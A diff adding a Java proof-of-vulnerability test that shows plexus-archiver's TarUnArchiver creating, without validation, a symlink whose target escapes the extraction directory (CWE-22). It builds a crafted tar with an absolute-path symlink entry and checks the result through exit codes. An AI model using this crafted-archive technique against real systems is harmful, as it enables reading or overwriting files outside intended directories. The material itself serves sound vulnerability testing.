@@ -1,0 +1,104 @@
+diff --git a/.security-pipeline/pov/TarSymlinkEscapePov.java b/.security-pipeline/pov/TarSymlinkEscapePov.java
+new file mode 100644
+index 0000000..19b7e5a
+--- /dev/null
++++ b/.security-pipeline/pov/TarSymlinkEscapePov.java
+@@ -0,0 +1,98 @@
++import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
++import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
++import org.codehaus.plexus.archiver.tar.TarUnArchiver;
++
++import java.io.FileOutputStream;
++import java.nio.file.Files;
++import java.nio.file.Path;
++import java.nio.file.Paths;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (path traversal via archive-created symlinks).
++ *
++ * Root cause: org.codehaus.plexus.archiver.AbstractUnArchiver#extractFile(...) creates a
++ * filesystem symlink at AbstractUnArchiver.java:371
++ * (SymlinkUtils.createSymbolicLink(targetFileName, new File(symlinkDestination)))
++ * using the "symlinkDestination" value taken verbatim from the archive entry
++ * (TarUnArchiver.java:118 te.getLinkName() / AbstractZipUnArchiver.java:173 zf.getUnixSymlink(ze)),
++ * with no validation that the *target* of the symlink stays inside the extraction
++ * destination directory. Only the symlink's own on-disk *location* is checked against
++ * the destination directory (AbstractUnArchiver.java:344-353); the string that becomes
++ * the symlink's target is never checked.
++ *
++ * This lets a crafted tar (or zip) plant a symlink inside the destination directory that
++ * points anywhere on the filesystem (absolute path or "../" traversal), including outside
++ * the extraction destination. That planted, dangling symlink is a trap: any later
++ * consumer that walks into the extracted tree and follows the link (a subsequent build
++ * step, a re-extraction into the same destination, a naive cleanup/copy routine, etc.)
++ * ends up reading or writing outside the intended destination directory -- classic
++ * tar/zip symlink path-traversal (CWE-22).
++ *
++ * This POV builds a real tar archive with commons-compress (the library plexus-archiver
++ * itself uses to read tar entries) containing a single symlink entry whose link target is
++ * an absolute path outside the extraction destination, feeds it to the real
++ * org.codehaus.plexus.archiver.tar.TarUnArchiver#extract() (unmodified product code), and
++ * verifies that the resulting on-disk symlink indeed escapes the destination directory.
++ *
++ * Exit code 0  => vulnerable (escaping symlink was created, unvalidated)
++ * Exit code 1  => patched/safe (escape was prevented or rejected)
++ */
++public class TarSymlinkEscapePov
++{
++    public static void main( String[] args )
++        throws Exception
++    {
++        Path base = Files.createTempDirectory( "plexus-symlink-pov" );
++        Path destDir = base.resolve( "dest" );
++        Files.createDirectories( destDir );
++        // A directory that already exists on disk, outside (a sibling of) destDir --
++        // this stands in for any real, sensitive path an attacker might target
++        // (e.g. an absolute path like /etc, or a relative "../../.." escape).
++        Path outsideDir = base.resolve( "outside-secret" );
++        Files.createDirectories( outsideDir );
++
++        Path tarFile = base.resolve( "evil.tar" );
++        String escapeTarget = outsideDir.toAbsolutePath().normalize().toString();
++
++        try ( TarArchiveOutputStream tos = new TarArchiveOutputStream( new FileOutputStream( tarFile.toFile() ) ) )
++        {
++            TarArchiveEntry symlinkEntry = new TarArchiveEntry( "pwn", TarArchiveEntry.LF_SYMLINK );
++            symlinkEntry.setLinkName( escapeTarget );
++            tos.putArchiveEntry( symlinkEntry );
++            tos.closeArchiveEntry();
++        }
++
++        // Exercise the real, unmodified product code path.
++        TarUnArchiver unarchiver = new TarUnArchiver();
++        unarchiver.setSourceFile( tarFile.toFile() );
++        unarchiver.setDestDirectory( destDir.toFile() );
++        unarchiver.extract();
++
++        Path createdLink = destDir.resolve( "pwn" );
++        boolean isSymlink = Files.isSymbolicLink( createdLink );
++        Path linkTarget = isSymlink ? Files.readSymbolicLink( createdLink ) : null;
++        Path resolvedTarget = isSymlink ? createdLink.getParent().resolve( linkTarget ).normalize() : null;
++
++        boolean escapesDest = isSymlink
++            && !resolvedTarget.startsWith( destDir.toAbsolutePath().normalize() );
++
++        System.out.println( "destDir       = " + destDir.toAbsolutePath() );
++        System.out.println( "outsideDir    = " + escapeTarget );
++        System.out.println( "createdLink   = " + createdLink + " (isSymlink=" + isSymlink + ")" );
++        System.out.println( "linkTarget    = " + linkTarget );
++        System.out.println( "resolvedTarget= " + resolvedTarget );
++
++        if ( escapesDest )
++        {
++            System.out.println( "VULNERABLE: TarUnArchiver created a symlink inside the destination "
++                + "directory whose target escapes that directory, with no validation." );
++            System.exit( 0 );
++        }
++        else
++        {
++            System.out.println( "SAFE: extraction did not produce an escaping symlink "
++                + "(target was rejected, rewritten, or extraction aborted)." );
++            System.exit( 1 );
++        }
++    }
++}
